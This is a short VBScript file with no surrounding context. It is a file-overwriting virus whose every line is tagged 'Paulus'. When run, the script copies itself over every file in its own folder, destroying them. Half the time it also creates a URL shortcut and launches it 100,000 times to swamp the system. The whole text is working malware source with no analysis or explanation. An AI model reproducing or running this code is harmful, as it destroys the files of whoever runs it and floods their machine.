   'Paulus
   On Error Resume Next
   'Paulus
   Dim Paulus, Paulus_1, Paulus_2, Paulus_3, Paulus_4
   'Paulus
   Randomize
   'Paulus
   Set Paulus_2 = CreateObject("Scripting.FileSystemObject")
   'Paulus
   Set Paulus_1 = Wscript.CreateObject("Wscript.Shell")
   'Paulus
   Paulus = Wscript.ScriptFullName
   'Paulus
   Paulus_3 = Left(Paulus, InStrRev(Paulus, "\"))
   'Paulus
   For Each target in Paulus_2.GetFolder(Paulus_3).Files
   'Paulus
     Paulus_2.CopyFile Paulus, target.Name, 1
   'Paulus
   Next
   'Paulus
   If Int((2 * Rnd) + 1) = 1 Then
   'Paulus
     Set Paulus_4 = Paulus_1.CreateShortcut("C:\Paulus.URL")
   'Paulus
     Paulus_4.TargetPath = "http://www..net"
   'Paulus
     Paulus_4.Save
   'Paulus
     For x = 1 to 100000
   'Paulus
        Paulus_1.Run ("C:\Paulus.URL")
   'Paulus
     Next
   'Paulus
   End If
   'Paulus
